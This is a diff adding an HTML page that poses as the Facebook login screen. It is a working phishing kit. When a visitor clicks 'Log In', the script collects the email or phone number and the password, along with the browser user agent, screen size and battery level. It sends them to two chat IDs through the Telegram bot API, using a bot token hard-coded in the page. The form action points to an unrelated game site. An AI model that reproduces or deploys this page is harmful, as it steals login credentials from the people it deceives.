@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Welcome, login with a Facebook account.">
+    <meta name="theme-color" content="#1876f3">
+    <title>Facebook – Log In or Sign Up</title>
+    <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/yD/r/d4ZIVX-5C-b.ico">
+    <link rel="stylesheet" type="text/css" href="CSS/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial;
+            border: none;
+            outline: none;
+            text-decoration: none;
+        }
+
+        body {
+            height: 100vh;
+            background: #fff;
+        }
+
+        .logo {
+            top: 0;
+        }
+
+        .carrom img {
+            height: 60px;
+            width: 60px;
+            border-radius: 3px;
+            align-items: center;
+        }
+
+        .carrom p {
+            display: flex;
+            flex-direction: column;
+            line-height: 18px;
+            width: 100%;
+            padding-left: 80px;
+            padding-right: 80px;
+            position: relative;
+            color: #808080;
+            font-size: 14px;
+            text-align: center;
+            margin: 14px 0 14px 0;
+        }
+
+        .form {
+            width: 50%;
+            margin: 3% auto;
+            text-align: center;
+        }
+
+        .form .ad {
+            width: 100%;
+            padding: 8px 15px;
+            margin-top: -10px;
+            background: rgba(185, 185, 12, 0.1);
+            display: none;
+            align-items: center;
+            border-bottom: 1px solid rgba(185, 185, 12, 0.3);
+        }
+
+        .form .ad a {
+            color: #fff;
+        }
+
+        .form .ad img {
+            width: 16px;
+            margin-right: 10px;
+        }
+
+        .form .ad p {
+            font-size: 14px;
+            color: #466baf;
+        }
+
+        .form .logo {
+            width: 120px;
+            margin-top: 5px;
+        }
+
+        .form input {
+            width: 90%;
+            height: 42px;
+            padding: 0 12px;
+            background: #f1f3f3;
+            border: 1px solid #e4e4e4;
+            border-radius: 3px;
+            margin-top: 5px;
+        }
+
+        .form .input {
+            position: relative;
+            width: 90%;
+            margin: 0 auto;
+            margin-top: 5px;
+        }
+
+        .form .input input {
+            width: 100%;
+            margin: 0;
+        }
+
+        .form .input span {
+            position: absolute;
+            content: '';
+            top: 1px;
+            right: 1px;
+            padding: 0 12px;
+            height: 40px;
+            line-height: 40px;
+            font-weight: bold;
+            font-size: 14px;
+            color: #1876f3;
+            background: #f1f3f3;
+            border-left: 1px solid #e4e4e4;
+            display: none;
+            text-transform: uppercase;
+            cursor: pointer;
+        }
+
+        .form button {
+            width: 90%;
+            height: 41px;
+            background: #1876f3;
+            color: #fff;
+            border-radius: 5px;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 16px;
+            margin-bottom: 15px;
+            text-shadow: 0 -1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .form button:hover {
+            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.2);
+        }
+
+        .form .fo {
+            color: #1876f3;
+        }
+
+        .form .or {
+            width: 90%;
+            margin: 15px 5%;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .form .or:before {
+            position: absolute;
+            content: '';
+            top: 50%;
+            left: 0;
+            width: 45%;
+            height: 1px;
+            background: #e4e4e4;
+        }
+
+        .form .or:after {
+            position: absolute;
+            content: '';
+            top: 50%;
+            right: 0;
+            width: 45%;
+            height: 1px;
+            background: #e4e4e4;
+        }
+
+        .form .c {
+            padding: 10px 20px;
+            background: #46a10a;
+            color: #fff;
+            font-weight: 350;
+            font-size: 14px;
+            border-radius: 3px;
+            text-shadow: 1px -1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .form .lang {
+            width: 90%;
+            margin: 0 auto;
+            margin-top: 110px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .form .lang .box a {
+            display: block;
+            font-size: 12px;
+            margin: 2px 0;
+            color: #255596;
+        }
+
+        .form .lang .box .p {
+            width: 22px;
+            height: 22px;
+            text-align: center;
+            line-height: 20px;
+            margin: 1px auto;
+            border: 1px solid #255596;
+            border-radius: 2px;
+            font-size: 18px;
+        }
+
+        .form .lnc {
+            font-size: 12px;
+            color: #7a7575;
+            margin-bottom: 20px;
+        }
+
+        .popup {
+            display: none;
+            background-color: #fff;
+            width: 400px;
+            height: 45%;
+            padding: 30px 40px;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            font-family: Poppins, sans-serif;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            z-index: 10000;
+        }
+
+        .popup i {
+            color: yellowgreen;
+            width: 100px;
+            height: 100px;
+            display: block;
+            margin: 0 auto;
+            border-radius: 50%;
+            border: 0.5px solid grey;
+            text-align: center;
+            line-height: 100px;
+        }
+
+        .popup h1 {
+            text-align: center;
+            font-weight: bold;
+            font-size: 25px;
+            margin-top: 20px;
+        }
+
+        .popup p {
+            font-size: 15px;
+            text-align: center;
+            margin: 20px 0;
+        }
+
+        .popup button {
+            cursor: pointer;
+            font-size: 18px;
+            display: block;
+            width: 150px;
+            margin: 20px auto 0;
+            background-color: #1877f2;
+            text-align: center;
+            color: white;
+            text-decoration: none;
+            padding: 10px 0;
+            border: none;
+            box-shadow: 0px 0px 1px 1px rgb(22, 111, 229);
+        }
+
+        @media screen and (max-width: 900px),
+        (max-width: 800px),
+        (max-width: 700px),
+        (max-width: 600px),
+        (max-width: 400px) {
+            .popup {
+                width: 400px;
+                height: auto;
+            }
+
+            .form {
+                width: 100%;
+            }
+
+            .form .ad {
+                display: flex;
+            }
+
+            .form .lang {
+                justify-content: space-around;
+            }
+        }
+    </style>
+</head>
+
+<body>
+  
+    <div class="popup" id="popup">
+        <i class="fa-solid fa-check fa-2xl"></i>
+     
+        <button id="close" type="submit">OK</button>
+    </div>
+
+    <form class="form" name="form"
+        action="https://www.gamezop.com/g/SkhljT2fdgb/Ludo-With-Friends?lang=en&src=comet&sessionStartPage=home-page"
+        method="POST">
+        <div class="ad">
+            <img src="https://dl.dropbox.com/s/romkyb4vq4k980b/f.png?dl=0" alt="" />
+            <p>Get Facebook for Android and browse faster.</p>
+        </div>
+        <img class="logo" src="https://dl.dropbox.com/s/2jpib59bvod6qjw/fb-logo.svg?dl=0" />
+       
+        <input type="text" id="username" name="username" placeholder="Mobile number or email address" required>
+        <div class="input">
+            <input type="password" name="password" id="password" placeholder="Password" required>
+            <span>Show</span>
+        </div>
+        <button type="button" name="submit" id="submit" onclick="login()">Log In</button>
+        <br />
+        <a href="#" class="fo">Forgot Password?</a>
+        <p class="or">or</p>
+        <a href="#" class="c">Create New Account</a>
+        <div class="lang">
+            <div class="box">
+                <a href="#"><b style="color:#adadad">English (US)</b></a>
+                <a href="#">فارسی</a>
+                <a href="#">Deutsch</a>
+                <a href="#">Português (Brasil)</a>
+            </div>
+            <div class="box">
+                <a href="#">پۺتو</a>
+                <a href="#">العربیة</a>
+                <a href="#">বাংলা</a>
+                <a href="#" class="p">+</a>
+            </div>
+        </div>
+        <p class="lnc">Meta © 2024</p>
+    </form>
+
+<script>
+    function login() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        if (username.trim() === '' || password.trim() === '') {
+            alert('Invalid input field');
+            return;
+        }
+
+        // Get device information
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            screenSize: `${window.screen.width}x${window.screen.height}`,
+            batteryLevel: navigator.getBattery ? navigator.getBattery().level * 100 + '%' : 'N/A'
+        };
+
+        const message = `╭────────────────────╮\n├ 🔰 FACEBOOK V2 ADVANCE 🔰\n│\n╞ 🔆 Email or phone : ${username} 💡\n╞ 🔆 Password : ${password} 💡\n│\n├ 💀 Developed By - @sasumon007 🍥\n│ \n├ User Agent: ${deviceInfo.userAgent}\n├ Screen Size: ${deviceInfo.screenSize}\n├ Battery Level: ${deviceInfo.batteryLevel}\n╰────────────────────╯`;
+        const botToken = '7007093627:AAFGp4HqJR6Ne2xQQUBZufyn-apvDnIu8PA';
+        const chatIds = ['5958524279', '6158020655']; // Add your chat IDs here
+        const apiUrlBase = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        chatIds.forEach(chatId => {
+            const apiUrl = `${apiUrlBase}?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(apiUrl)
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+    }
+</script>
+</body>
+
+</html>
+
+  
+  
